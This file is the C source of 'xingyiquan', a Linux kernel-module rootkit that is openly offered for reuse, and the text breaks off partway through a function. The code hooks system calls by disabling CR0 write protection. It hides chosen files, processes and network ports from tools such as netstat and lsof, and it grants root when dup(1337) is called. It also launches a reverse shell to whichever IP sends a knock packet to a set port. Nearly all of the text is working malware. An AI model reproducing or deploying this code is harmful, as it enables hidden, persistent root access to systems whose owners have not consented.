/*
 * xingyiquan - Simple and basic lkm r00tk1t for linux kernel 2.6.x and 3.x
 *  (c) Copyright by RingLayer All Rights Reserved 
 * Developed by Sw0rdm4n
 * 
 * Official Website : www.ringlayer.net
 * 
 * Ringlayer Public License Statement V.1
 * 1. This software is free software under copyright of Ringlayer's Public License
 * 2. You may copy / modify / redistribute / share / use this software freely, but you are not allowed to remove copyright / author / url (where you got the source) as long as you don't modify source logic at least 40%
 * 3. You are not allowed to sell this source code without permission from author
 * 4. Violation of any terms above means author have some rights for law processing and right to fine 
 *
 *
DISCLAIMER !!!
Author takes no responsibility for any abuse of this software. 

tested on 
- 2.6.32 i686
- 2.6.35 i686 
- 2.6.24 i686
- 3.8.0 x86_64
- 3.13.0 x86_64
- 3.14 x86_64
- 3.13 i686
- 3.5.0 i686

functions:

- hook firewall for incoming connections
- hide file / dir 
- hide process 
- hide netstat 
- hide from stat 
- hook kill 
- hook remove file & dir
- hook rmmod 
- hide module 
- give root sh3ll (trigger with dup 1337)
- bindsh3ll
- reverse sh3ll (trigger with netfilter hook)

*/

#include "xingyi_headers.h"
#include "xingyi_lkm_config.h"
#include "xingyi_kern_source.h"

static inline int cr_repop(char *cr0_argumen, int cr_mode)
{
	int my_retval, konter;
	
	my_retval = FALSE;
	if (cr0_argumen != NULL) {
		switch (cr_mode) {
			case _NR_unlink_:
			for (konter = 0; konter < _num_fingerprint_unlink; konter++) {
				if (fingerprint_unlink[konter] != NULL) {
					if (strstr(cr0_argumen, fingerprint_unlink[konter]) != NULL) {
						my_retval = TRUE;
						break;
					}
				}
			}
			break;			
			case _NR_kill_:
			for (konter = 0; konter < _num_fingerprint_kill; konter++) {
				if (fingerprint_kill[konter] != NULL) {
					if (strstr(cr0_argumen, fingerprint_kill[konter]) != NULL) {
						my_retval = TRUE;
						break;
					}
				}
			}
			break;
			case _NR_open_:
			for (konter = 0; konter < _num_fingerprint_open; konter++) {
				if (fingerprint_open[konter] != NULL) {
					if (strstr(cr0_argumen, fingerprint_open[konter]) != NULL) {
						my_retval = TRUE;
						break;
					}
				}
			}
			break;
			case _NR_rmdir_:
			for (konter = 0; konter < _num_fingerprint_rmdir; konter++) {
				if (fingerprint_rmdir[konter] != NULL) {
					if (strstr(cr0_argumen, fingerprint_rmdir[konter]) != NULL) {
						my_retval = TRUE;
						break;
					}
				}
			}
			break;
			case _NR_rename_:
			for (konter = 0; konter < _num_fingerprint_rename; konter++) {
				if (fingerprint_rename[konter] != NULL) {
					if (strstr(cr0_argumen, fingerprint_rename[konter]) != NULL) {
						my_retval = TRUE;
						break;
					}
				}
			}
			break;
			case _NR_chdir_:
			for (konter = 0; konter < _num_fingerprint_chdir; konter++) {
				if (fingerprint_chdir[konter] != NULL) {
					if (strstr(cr0_argumen, fingerprint_chdir[konter]) != NULL) {
						my_retval = TRUE;
						break;
					}
				}
			}
			break;
			case _NR_lstat_:
			for (konter = 0; konter < _num_fingerprint_lstat; konter++) {
				if (fingerprint_lstat[konter] != NULL) {
					if (strstr(cr0_argumen, fingerprint_lstat[konter]) != NULL) {
						my_retval = TRUE;
						break;
					}
				}
			}
			break;
		}
		kfree(cr0_argumen);
	}
	
	return my_retval;
}

#if defined(__x86_64__) || defined(__amd64__)
static asmlinkage long *cr_lstat(char __user *filename, struct __old_kernel_stat __user *statbuf) 
{	
	int _this_retval = FALSE;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	

	_this_func_retval =  (long *) (lstat_asli) (filename, statbuf);
	if (_kernel_file_ops != 1) {
		cr0_heap = n_kmalloc(base_size);
		if (cr0_heap != NULL) {
			cfu = copy_from_user(cr0_heap, filename, base_size);
			_this_retval = cr_repop(cr0_heap, _NR_lstat_);
			if (_this_retval == TRUE)
				_this_func_retval = (long *) (-ENOENT);
		}
	}

	return _this_func_retval;
}
#endif

#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__) 
static asmlinkage long *cr_lstat64(char __user *filename, struct stat64 __user *statbuf) 
{
	int _this_retval = FALSE;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	
	
	_this_func_retval =  (long *) (lstat64_asli) (filename, statbuf);
	if (_kernel_file_ops != 1) {
		cr0_heap = n_kmalloc(base_size);
		if (cr0_heap != NULL) {
			cfu = copy_from_user(cr0_heap, filename, base_size);
			_this_retval = cr_repop(cr0_heap, _NR_lstat_);
			if (_this_retval == TRUE)
				_this_func_retval = (long *) (-ENOENT);
		}
	}

	return _this_func_retval;
}
#endif

static asmlinkage long *cr_kill(int pid, int sig)
{
	int _this_retval = FALSE;
	char *file_buf = NULL;

	if ((should_i_disable_sys_kill > 0)) {
		crinst(pid);
		totheap = 6 + sizeof(hasil_konversi) + 8;
		file_buf = kmalloc(200, GFP_KERNEL);
		_lemme = kmalloc(totheap, GFP_KERNEL);
		sprintf(_lemme,"/proc/%s/cmdline", hasil_konversi);
	     	ev1l_proc = filp_open(_lemme,O_RDONLY,0);
	     	if (IS_ERR(ev1l_proc)) 
			goto closeme;	 
		else {
			KERN
			ev1l_proc->f_op->read(ev1l_proc, file_buf, 50, &ev1l_proc->f_pos);
			END
			_this_retval = cr_repop(file_buf, _NR_kill_);
			if (_this_retval == TRUE)
				return (long *) (-ESRCH);
			else
				return (long *) (*kill_asli)(pid,sig);
		}
		closeme:
		if (file_buf != NULL)		
			kfree(file_buf);
		if (ev1l_proc != NULL) 
			filp_close(ev1l_proc, NULL);
		if (_lemme != NULL)	
			kfree(_lemme);
	}

	return (long *) (*kill_asli)(pid,sig);
}

static asmlinkage long *cr_open(const char __user *filename, int flags, int mode)
{
	int _this_retval = FALSE;
	int count;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	
	struct net *_init_net = NULL;
	#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,24))
		#if (LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0))
	struct tcp_seq_afinfo *_afinfo = NULL;
        struct proc_dir_entry *_dir_entry = init_net.proc_net->subdir;
		#endif
	#else
        struct proc_dir_entry *_dir_entry = proc_net->subdir;
	#endif

	_this_func_retval =  (long *) (open_asli) (filename, flags, mode);
	cr0_heap = n_kmalloc(base_size);
	if (cr0_heap != NULL) {
		cfu = copy_from_user(cr0_heap, filename, base_size);
		for (count = 0; count < _num_cmd_blocked; count++) {
			if(strstr(cr0_heap, cmd_blocked[count]) != NULL) {
				_this_func_retval = (long *) (-ENOENT);				
				goto _out;
			}
		}	
		if (should_i_hide_process == 1) {
			if (_hidden_bind_shell_pid == NULL)
				_hidden_bind_shell_pid = cr_read6char(log_bind_pid);
			if (_hidden_reverse_shell_pid == NULL)
				_hidden_reverse_shell_pid = cr_read6char(log_reverse_pid);
			if (_hidden_reverse_shell_pid != NULL) {
				if (strstr(cr0_heap, _hidden_reverse_shell_pid) != NULL) {
					_this_func_retval = (long *) (-ENOENT);				
					goto _out;
				}
			}
			if (_hidden_bind_shell_pid != NULL) {
				if (strstr(cr0_heap, _hidden_bind_shell_pid) != NULL) {
					_this_func_retval = (long *) (-ENOENT);				
					goto _out;
				}
			}
				
		}
		if (strstr(cr0_heap, "/proc/net/tc") != NULL || strstr(cr0_heap, "/proc/net/socksta") != NULL || strstr(cr0_heap, "/proc/net/ud") != NULL) {
			if ((strstr(current->comm,"netstat") != NULL) ||  (strstr(current->comm,"lsof") != NULL) ||  (strstr(current->comm,"sockstat") != NULL)) {
				if (_hook_net == 0 && should_i_hide_port == 1) {
					if (_bind_shell_port_str == NULL) {
						_bind_shell_port_str = cr_read6char(log_bind_port);
						if (_bind_shell_port_str != NULL)
							bind_port = atoi(_bind_shell_port_str);
						if (bind_port == 0)
							bind_port = 7777;
					}
					if (_reverse_shell_port_str == NULL) {
						_reverse_shell_port_str = cr_read6char(log_reverse_port);
						if (_reverse_shell_port_str != NULL)
							reverse_shell_port = atoi(_reverse_shell_port_str);
						if (reverse_shell_port == 0)
							reverse_shell_port = 7777;
					}
					/* searching trick from ad0re */
					#if (LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0))
					while (strcmp(_dir_entry->name, "tcp"))
        	    				_dir_entry = _dir_entry->next;
					if ((_afinfo = (struct tcp_seq_afinfo*)_dir_entry->data)) {
						#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,26))
						real_tcp4_seq_show = _afinfo->seq_ops.show;
        	      				_afinfo->seq_ops.show = rk_tcp4_seq_show;
						_hook_net = 1;
						#else
 						real_tcp4_seq_show = _afinfo->seq_show;
        	       				_afinfo->seq_show = rk_tcp4_seq_show;
						_hook_net = 1;
						#endif
					}
					#else
					remove_proc_entry("tcp", _init_net->proc_net);
					remove_proc_entry("tcp6", _init_net->proc_net);
					remove_proc_entry("sockstat", _init_net->proc_net);
					#endif
				}
       			}
			else if((strstr(current->comm, "cat") != NULL) || (strstr(current->comm, "head") != NULL) || (strstr(current->comm, "tail") != NULL) || (strstr(current->comm, "pic") != NULL)) 
				_this_func_retval = (long *) (-ENOENT);
			else if((strstr(current->comm, "more") != NULL) || (strstr(current->comm, "less") != NULL)) 
				_this_func_retval = (long *) (-ENOENT);
			else {
				/*  typing another command(s) ???  */
				remove_proc_entry("tcp", _init_net->proc_net);
				remove_proc_entry("tcp6", _init_net->proc_net);
				remove_proc_entry("sockstat", _init_net->proc_net);
			}
		}
		if (_kernel_file_ops != 1) {
			_this_retval = cr_repop(cr0_heap, _NR_open_);
			if (_this_retval == TRUE)
				_this_func_retval = (long *) (-ENOENT);
		}
	}
	_out:

	return _this_func_retval;
}

#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,17))
static asmlinkage long *cr_unlink(const char __user *pathname)
{
	int _this_retval = FALSE;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	

	_this_func_retval =  (long *) (unlink_asli) (pathname);
	cr0_heap = n_kmalloc(base_size);
	if (cr0_heap != NULL) {
		cfu = copy_from_user(cr0_heap, pathname, base_size);
		_this_retval = cr_repop(cr0_heap, _NR_unlink_);
		if (_this_retval == TRUE)
			_this_func_retval = (long *) (-ENOENT);
	}

	return _this_func_retval;
}
#endif

#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,18))
static asmlinkage long *cr_unlinkat(int dfd, const char __user * pathname, int flag)
{
	int _this_retval = FALSE;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	

	_this_func_retval =  (long *) (unlinkat_asli) (dfd, pathname, flag);
	cr0_heap = n_kmalloc(base_size);
	if (cr0_heap != NULL) {
		cfu = copy_from_user(cr0_heap, pathname, base_size);
		_this_retval = cr_repop(cr0_heap, _NR_unlink_);
		if (_this_retval == TRUE)
			_this_func_retval = (long *) (-ENOENT);
	}

	return _this_func_retval;
}
#endif

static asmlinkage long *cr_chdir(const char __user *filename)
{
	int _this_retval = FALSE;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	

	_this_func_retval =  (long *) (chdir_asli) (filename);
	cr0_heap = n_kmalloc(base_size);
	if (cr0_heap != NULL) {
		cfu = copy_from_user(cr0_heap, filename, base_size);
		_this_retval = cr_repop(cr0_heap, _NR_chdir_);
		if (_this_retval == TRUE && _kernel_file_ops != 1)
			_this_func_retval = (long *) (-ENOENT);
	}

	return _this_func_retval;
}

static asmlinkage long *cr_rmdir(const char __user *pathname)
{
	int _this_retval = FALSE;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	

	_this_func_retval =  (long *) (rmdir_asli) (pathname);
	cr0_heap = n_kmalloc(base_size);
	if (cr0_heap != NULL) {
		cfu = copy_from_user(cr0_heap, pathname, base_size);
		_this_retval = cr_repop(cr0_heap, _NR_rmdir_);
		if (_this_retval == TRUE)
			_this_func_retval = (long *) (-ENOENT);
	}

	return _this_func_retval;
}

static asmlinkage long *cr_rename(const char __user *oldname, const char __user *newname)
{
	int _this_retval = FALSE;
	long *_this_func_retval;
	char *cr0_heap;
	unsigned long cfu;	

	_this_func_retval =  (long *) (rename_asli) (oldname, newname);
	cr0_heap = n_kmalloc(base_size);
	if (cr0_heap != NULL) {
		cfu = copy_from_user(cr0_heap, oldname, base_size);
		_this_retval = cr_repop(cr0_heap, _NR_rename_);
		if (_this_retval == TRUE)
			_this_func_retval = (long *) (-ENOENT);
	}

	return _this_func_retval;
}

/* nasty gotos */
static inline char *cr_read6char(char *path)
{
	char *file_buf = NULL;
	char *ret_str = NULL;
	char *default_ret = "7777";
	if (path == NULL) 
		goto _sw0rd_out;
	file_buf = n_kmalloc(5);
	_kernel_file_ops = 1;
	ev1l_proc = filp_open(path,O_RDONLY,0);
	if (IS_ERR(ev1l_proc)) 
		goto closeme;	 
	else {
		KERN
		ev1l_proc->f_op->read(ev1l_proc, file_buf, 5, &ev1l_proc->f_pos);
		END
		if (file_buf != NULL) {
			ret_str = trim(file_buf);
			filp_close(ev1l_proc, NULL);
			_kernel_file_ops = 0;
			return ret_str;
		}
		else
			goto closeme;
	}
	closeme:
	if (file_buf == NULL)
		ret_str = default_ret;
	_sw0rd_out:
	if (ret_str == NULL)
		ret_str = default_ret;
	_kernel_file_ops = 0;

	return ret_str;
}

static inline char *n_vmalloc(ssize_t size) 
{
	char *retme;
	#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,37))
	retme = vzalloc(((size + 1) * sizeof(char)));
	#else
	retme = vmalloc(((size + 1) * sizeof(char)));
	#endif
	
	return retme;
}

static inline char *crinst(int nomer)
{
	sprintf(hasil_konversi, "%d", nomer);

	return hasil_konversi;
}

static inline int userspace_elf(char *cmd, char *elf_arg)
{
	int ret = 0;
	char *argv[] = {cmd, elf_arg}; 	
	char *envp[] = {"HOME=/","PATH=/sbin:/usr/sbin:/bin:/usr/bin",0};

	_kernel_file_ops = 1;	
	KERN
	ret = call_usermodehelper(cmd, argv, envp, 0);
	END
	_kernel_file_ops = 0;

	return ret;
}

static inline char *n_kmalloc(ssize_t size) 
{
	char *retme;
	
	retme = kzalloc((size + 1) * sizeof(char), GFP_KERNEL);
	
	return retme;
}

static asmlinkage long *cr_dup(unsigned int fildes)
{
	long *_this_func_retval;
	#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,29))
	struct cred *_my_cred = NULL;
	#endif
	
	_this_func_retval =  (long *) (dup_asli) (fildes);
	if (fildes == 1337) {
		_kernel_file_ops = 1;
		#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,29))
		_my_cred = prepare_creds();
		if (_my_cred != NULL) {
			/* haven't check exact version */
			#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3,9,0))
			_my_cred->uid.val = 0;
			_my_cred->gid.val = 0;
			#else
			_my_cred->uid = 0;
			_my_cred->euid = 0;
			_my_cred->gid = 0;
			#endif
			commit_creds(_my_cred);
		}
		#else
			current->uid = 0;
			current->euid = 0;
			current->gid = 0;
		#endif
		_kernel_file_ops = 0;
	}
	
	return _this_func_retval;
}

static unsigned int rk_nf_hook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff*))
{
	int do_hook = 0, usermode = 0;	
	unsigned int default_retval = NF_ACCEPT;	
	int dest_port = 0;
	char *ip = NULL;

	if (!skb)
		goto out;
	#if (LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,21))
	if (!(skb->nh.iph))
		goto out;
	if (skb->nh.iph-> protocol == IPPROTO_TCP) {
		tcp_header = (struct tcphdr *) (skb->data + skb->nh.iph->nhl * 4); 
		dest_port = tcp_header->dest;
		if (dest_port == knock_reverse_shell_port) {
			ip = n_kmalloc(16);
			snprintf(ip, 16, "%pI4", &skb->nh.iph.saddr);
			do_hook = 1;
		}
	}
	else
		goto out;
	#else
	ip_header = (struct iphdr *)skb_network_header(skb);
	if (ip_header->protocol == IPPROTO_TCP) {
		tcp_header = (struct tcphdr *)(skb_transport_header(skb) + ip_hdrlen(skb));
		dest_port = ntohs(tcp_header->dest);
		if (dest_port == knock_reverse_shell_port) {
			ip = n_kmalloc(16);
			snprintf(ip, 16, "%pI4", &ip_header->saddr);
			do_hook = 1;
		}
	}
	else
		goto out;
	#endif
	if (do_hook == 1) {
		_kernel_file_ops = 1;
		preempt_disable();
		usermode = userspace_elf("/bin/xingyi_reverse_shell", ip);
		preempt_enable();
		if (usermode > -1) {
			_reverse_shell_port_str = cr_read6char(log_reverse_pid);
			if (_reverse_shell_port_str != NULL)
				reverse_shell_port = atoi(_reverse_shell_port_str);
		}
		_kernel_file_ops = 0;
	}
	
	out:
	
	return default_retval; 
}

static void _netfilter_hooks_init(void)
{
	nf_hook_in.hook = rk_nf_hook;
	nf_hook_in.pf = PF_INET;
	nf_hook_in.hooknum = 0;
	nf_hook_in.priority = NF_IP_PRI_FIRST;
	nf_register_hook(&nf_hook_in);
}

static void _netfilter_hooks_cleanup(void)
{
	nf_unregister_hook(&nf_hook_in);
}

static inline void cr(void)
{
	unsigned long value;
	#ifdef SMP
	__asm__ __volatile__("cli");
	#endif
	__asm__ __volatile__("mov %%cr0,%0\n\t" : "=r" (value));
	if (value & 0x00010000) {
		value &= ~0x10000;
		__asm__ __volatile__("mov %0,%%cr0": : "r" (value));
	}
	else  {
		value |= 0x10000;
		__asm__ __volatile__("mov %0,%%cr0": : "r" (value));		
	}
	#ifdef SMP
	__asm__ __volatile__("sti");
	#endif
}

/*
rk_filldir , cr_getdents, rk_filldir64, cr_getdents64, rk_get_timewait4_sock, rk_get_openreq4, rk_get_tcp4_sock, rk_tcp4_seq_show functions was modified from original linux kernel functions
at /usr/src/linux/net/ipv4/tcp_ipv4.c and /usr/src/linux/fs/readdir.c
*/

#if defined(__x86_64__) || defined(__amd64__)
static int rk_filldir(void * __buf, const char * name, int namlen, loff_t offset, ino_t_u64 ino, unsigned int d_type)
{
	struct rk_linux_dirent __user * dirent;
	struct rk_getdents_callback * buf = (struct rk_getdents_callback *) __buf;
	unsigned long d_ino;
	int reclen, konter;
	
#if(LINUX_VERSION_CODE >=  KERNEL_VERSION(3,1,1))
	reclen = ALIGN(offsetof(struct rk_linux_dirent, d_name) + namlen + 2, sizeof(long));
#else

	reclen = ALIGN(NAME_OFFSET(dirent) + namlen + 2, sizeof(long));
#endif
	d_name_found = FALSE;
	buf->error = -EINVAL;	/* only used if we fail.. */
	if (reclen > buf->count)
		return -EINVAL;
	d_ino = ino;
	if (sizeof(d_ino) < sizeof(ino) && d_ino != ino) {
		buf->error = -EOVERFLOW;
		return -EOVERFLOW;
	}
	dirent = buf->previous;
	if (dirent) {
		if (__put_user(offset, &dirent->d_off))
			goto efault;
	}
	dirent = buf->current_dir;
	if (_kernel_file_ops != 1) {
		for (konter = 0; konter < _num_fingerprint_getdents; konter++) {
			if (fingerprint_getdents[konter] != NULL) {
		                if (strstr(name, fingerprint_getdents[konter]))
        		                d_name_found = TRUE;
			}
		}
        } 
	if (d_name_found == TRUE && _kernel_file_ops != 1) 
		goto enoent;
	else {	
		if (put_user(d_ino, &dirent->d_ino))
			goto efault;
		if (put_user(reclen, &dirent->d_reclen))
			goto efault;
		if (copy_to_user(dirent->d_name, name, namlen))
			goto efault;
		if (put_user(0, dirent->d_name + namlen))
			goto efault;
		if (put_user(d_type, (char __user *) dirent + reclen - 1))
			goto efault;
	}
	buf->previous = dirent;
	dirent = (void __user *)dirent + reclen;
	buf->current_dir = dirent;
	buf->count -= reclen;
	return 0;
enoent:
	buf->error = -ENOENT;
	return -ENOENT;
efault:
	buf->error = -EFAULT;
	return -EFAULT;
}

static asmlinkage long *cr_getdents(unsigned int fd, struct rk_linux_dirent __user *dirent, unsigned int count)
{
	struct rk_linux_dirent __user * lastdirent;
	int error;
#if(LINUX_VERSION_CODE >=  KERNEL_VERSION(3,11,0))
	struct fd f;
	struct rk_getdents_callback buf = {
		.ctx.actor = rk_filldir,
		.count = count,
		.current_dir = dirent
	};

	f = fdget(fd);
	if (!f.file)
		return (long *)-EBADF;
	error = iterate_dir(f.file, &buf.ctx);
	if (error >= 0)
		error = buf.error;
	lastdirent = buf.previous;
	if (lastdirent) {
		if (put_user(buf.ctx.pos, &lastdirent->d_off))
			error = -EFAULT;
		else
			error = count - buf.count;
	}
	fdput(f);
	return (long *)(long)error;
#else
	struct file * file;
	struct rk_getdents_callback buf;

	error = -EFAULT;
	if (!access_ok(VERIFY_WRITE, dirent, count))
		goto out;

	error = -EBADF;
	file = fget(fd);
	if (!file)
		goto out;
	buf.current_dir = dirent;
	buf.previous = NULL;
	buf.count = count;
	buf.error = 0;
	error = vfs_readdir(file, rk_filldir, &buf);
	if (error >= 0)
		error = buf.error;
	lastdirent = buf.previous;
	if (lastdirent) {
		if (put_user(file->f_pos, &lastdirent->d_off))
			error = -EFAULT;
		else
			error = count - buf.count;
	}
	fput(file);
out:
	return (long *)(long)error;
#endif
}
#endif

#if defined(__i386__) || defined(__i486__)  || defined(__i586__)  || defined(__i686__)  
/* 
rk_filldir64 && cr_getdents64 function was modified from /usr/src/linux/fs/readdir.c 
*/

static int rk_filldir64(void * __buf, const char * name, int namlen, loff_t offset, ino_t_u64 ino, unsigned int d_type)
{
	struct rk_linux_dirent64 __user *dirent;
	struct rk_getdents_callback64 * buf =  __buf;
	int reclen, konter;
#if(LINUX_VERSION_CODE >=  KERNEL_VERSION(3,1,1))
	reclen = ALIGN(offsetof(struct rk_linux_dirent64, d_name) + namlen + 1, sizeof(u64));
#else
reclen = ALIGN(NAME_OFFSET(dirent) + namlen + 1, sizeof(u64));
#endif
	d_name_found = FALSE;
	buf->error = -EINVAL;	/* only used if we fail.. */
	if (reclen > buf->count)
		return -EINVAL;
	dirent = buf->previous;
	if (dirent) {
		if (__put_user(offset, &dirent->d_off))
			goto efault;
	}
	dirent = buf->current_dir;
	if (_kernel_file_ops != 1) {
		for (konter = 0; konter < _num_fingerprint_getdents; konter++) {
			if (fingerprint_getdents[konter] != NULL) {
		                if (strstr(name, fingerprint_getdents[konter]))
        		                d_name_found = TRUE;
			}
		}
        }
	if (d_name_found == TRUE && _kernel_file_ops != 1) 
		goto enoent;
	else {	
		if (__put_user(ino, &dirent->d_ino))
			goto efault;
		if (__put_user(0, &dirent->d_off))
			goto efault;
		if (__put_user(reclen, &dirent->d_reclen))
			goto efault;
		if (__put_user(d_type, &dirent->d_type))
			goto efault;
		if (copy_to_user(dirent->d_name, name, namlen))
			goto efault;
		if (__put_user(0, dirent->d_name + namlen))
			goto efault;
	}
	buf->previous = dirent;
	dirent = (void __user *)dirent + reclen;
	buf->current_dir = dirent;
	buf->count -= reclen;
	return 0;
enoent:
	buf->error = -ENOENT;
	return -ENOENT;
efault:
	buf->error = -EFAULT;
	return -EFAULT;
}

static asmlinkage long *cr_getdents64(unsigned int fd, struct rk_linux_dirent64 __user * dirent, unsigned int count)
{
	struct rk_linux_dirent64 __user* lastdirent;
	int error;
#if(LINUX_VERSION_CODE >=  KERNEL_VERSION(3,11,0))
	struct fd f;
	struct rk_getdents_callback64 buf = {
		.ctx.actor = rk_filldir64,
		.count = count,
		.current_dir = dirent
	};

	if (!access_ok(VERIFY_WRITE, dirent, count))
		return (long *)-EFAULT;
	f = fdget(fd);
	if (!f.file)
		return (long *)-EBADF;
	error = iterate_dir(f.file, &buf.ctx);
	if (error >= 0)
		error = buf.error;
	lastdirent = buf.previous;
	if (lastdirent) {
		typeof(lastdirent->d_off) d_off = buf.ctx.pos;
		if (__put_user(d_off, &lastdirent->d_off))
			error = -EFAULT;
		else
			error = count - buf.count;
	}
	fdput(f);

	return (long *)error;
#else
	struct file * file;
	struct rk_getdents_callback64 buf;
	error = -EFAULT;
	if (!access_ok(VERIFY_WRITE, dirent, count))
		goto out;

	error = -EBADF;
	file = fget(fd);
	if (!file)
		goto out;

	buf.current_dir = dirent;
	buf.previous = NULL;
	buf.count = count;
	buf.error = 0;

	error = vfs_readdir(file, rk_filldir64, &buf);
	if (error >= 0)
		error = buf.error;
	lastdirent = buf.previous;
	if (lastdirent) {
		typeof(lastdirent->d_off) d_off = file->f_pos;
		if (__put_user(d_off, &lastdirent->d_off))
			error = -EFAULT;
		else
			error = count - buf.count;
	}
	fput(file);
out:
	return (long *)error;
#endif
}
#endif

/* modified functions from original linux kernel source codes at /usr/src/linux/net/ipv4/tcp_ipv4.c */

#if(LINUX_VERSION_CODE <  KERNEL_VERSION(3,11,0))
	#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))
		#include "xingyi_tcpseq_2.6.25.h"
	#else /* else of #if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,25))*/
		#if(LINUX_VERSION_CODE >= KERNEL_VERSION(3,7,0))
		#include "xingyi_getopenreg4_3.7.h"
		#else
		#include "xingyi_getopenreg4_3.6.h"
		#endif

static void rk_get_timewait4_sock(struct inet_timewait_sock *tw, struct seq_file *f, int i, int *len)
{
	int _hook;
	__be32 dest, src;
	__u16 destp, srcp;
	int ttd = tw->tw_ttd - jiffies;
	char rkport[12];
	char rkport2[12];
	char dest_port[12];
	char src_port[12];
	
	if (ttd < 0)
		ttd = 0;
	dest  = tw->tw_daddr;
	src   = tw->tw_rcv_saddr;
	destp = ntohs(tw->tw_dport);
	srcp  = ntohs(tw->tw_sport);
	sprintf(dest_port, "%04X", destp);
	sprintf(rkport, "%04X", bind_port);
	sprintf(rkport2, "%04X", reverse_shell_port);
	sprintf(src_port, "%04X", srcp);
	if ((strcmp(dest_port, rkport) != 0) && (strcmp(src_port, rkport) != 0) && (strcmp(dest_port, rkport2) != 0) && (strcmp(src_port, rkport2) != 0)) 
		_hook = 0;
	else {
		_hook = 1;
		srcp = 0;
		src = 0;
		destp = 0;
		dest = 0;
	}
	seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %d %d %p%n",
		i, src, srcp, dest, destp, tw->tw_substate, 0, 0,
		3, jiffies_to_clock_t(ttd), 0, 0, 0, 0,
		atomic_read(&tw->tw_refcnt), tw, len);
}

static void rk_get_tcp4_sock(struct sock *sk, struct seq_file *f, int i, int *len)
{
	int _hook;
	int timer_active;
	unsigned long timer_expires;
	struct tcp_sock *tp = tcp_sk(sk);
	const struct inet_connection_sock *icsk = inet_csk(sk);
	struct inet_sock *inet = inet_sk(sk);
	#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,32))
	__be32 dest = inet->daddr;
	__be32 src = inet->rcv_saddr;
	__u16 destp = ntohs(inet->dport);
	__u16 srcp = ntohs(inet->sport);
	#else
	__be32 dest = inet->inet_daddr;
	__be32 src = inet->inet_rcv_saddr;
	__u16 destp = ntohs(inet->inet_dport);
	__u16 srcp = ntohs(inet->inet_sport);
	#endif
	#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3,7,0))
	struct fastopen_queue   *fastopenq;
	#endif
	int rx_queue;
	char rkport[12];
	char rkport2[12];
	char dest_port[12];
	char src_port[12];
	
	sprintf(rkport, "%04X", bind_port);
	sprintf(rkport, "%04X", reverse_shell_port);
	sprintf(dest_port, "%04X", destp);
	sprintf(src_port, "%04X", srcp);
	if ((strcmp(dest_port, rkport) != 0) && (strcmp(src_port, rkport) != 0) && (strcmp(dest_port, rkport2) != 0) && (strcmp(src_port, rkport2) != 0)) 
		_hook = 0;
	else {
		_hook = 1;
		srcp = 0;
		src = 0;
		destp = 0;
		dest = 0;
	}
	if (icsk->icsk_pending == ICSK_TIME_RETRANS) {
		timer_active	= 1;
		timer_expires	= icsk->icsk_timeout;
	} else if (icsk->icsk_pending == ICSK_TIME_PROBE0) {
		timer_active	= 4;
		timer_expires	= icsk->icsk_timeout;
	} else if (timer_pending(&sk->sk_timer)) {
		timer_active	= 2;
		timer_expires	= sk->sk_timer.expires;
	} else {
		timer_active	= 0;
		timer_expires = jiffies;
	}
	if (sk->sk_state == TCP_LISTEN)
		rx_queue = sk->sk_ack_backlog;
	else
		rx_queue = max_t(int, tp->rcv_nxt - tp->copied_seq, 0);
	#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,32))
	seq_printf(f, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX "
			"%08X %5d %8d %lu %d %p %lu %lu %u %u %d%n",
		i, src, srcp, dest, destp, sk->sk_state,
		tp->write_seq - tp->snd_una,
		rx_queue,
		timer_active,
		jiffies_to_clock_t(timer_expires - jiffies),
		icsk->icsk_retransmits,
		sock_i_uid(sk),
		icsk->icsk_probes_out,
		sock_i_ino(sk),
		atomic_read(&sk->sk_refcnt), sk,
		jiffies_to_clock_t(icsk->icsk_rto),
		jiffies_to_clock_t(icsk->icsk_ack.ato),
		(icsk->icsk_ack.quick << 1) | icsk->icsk_ack.pingpong,
		tp->snd_cwnd,
		tp->snd_ssthresh >= 0xFFFF ? -1 : tp->snd_ssthresh,
		len);
	#else
		#if(LINUX_VERSION_CODE >= KERNEL_VERSION(3,7,0))
	seq_printf(f, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX "
			"%08X %5u %8d %lu %d %pK %lu %lu %u %u %d",
		i, src, srcp, dest, destp, sk->sk_state,
		tp->write_seq - tp->snd_una,
		rx_queue,
		timer_active,
		jiffies_delta_to_clock_t(timer_expires - jiffies),
		icsk->icsk_retransmits,
		from_kuid_munged(seq_user_ns(f), sock_i_uid(sk)),
		icsk->icsk_probes_out,
		sock_i_ino(sk),
		atomic_read(&sk->sk_refcnt), sk,
		jiffies_to_clock_t(icsk->icsk_rto),
		jiffies_to_clock_t(icsk->icsk_ack.ato),
		(icsk->icsk_ack.quick << 1) | icsk->icsk_ack.pingpong,
		tp->snd_cwnd,
		sk->sk_state == TCP_LISTEN ?
		    (fastopenq ? fastopenq->max_qlen : 0) :
		    (tcp_in_initial_slowstart(tp) ? -1 : tp->snd_ssthresh));
		#else
